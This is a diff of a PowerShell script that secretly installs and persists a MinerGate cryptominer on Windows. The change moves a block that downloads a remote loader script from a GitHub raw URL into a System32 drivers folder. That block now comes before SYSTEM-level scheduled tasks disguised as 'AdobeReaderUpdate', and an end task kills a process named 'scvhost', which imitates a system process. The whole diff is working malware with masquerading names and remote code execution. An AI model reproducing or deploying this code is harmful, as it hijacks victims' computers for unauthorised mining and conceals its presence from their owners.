@@ -41,16 +41,16 @@ Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\Sys
 Remove-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe
 
 
+# Download Loader
+$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
+$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url2, $output2)
+
+
 # Create scheduled Start Task
 SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /du 11:55 /k /ri 30 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"
 
 
 # Create scheduled End Task
 SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Daily /st 06:10:00 /tr "powershell.exe Stop-Process -Name scvhost"
-
-
-# Download Loader
-$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
-$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url2, $output2)
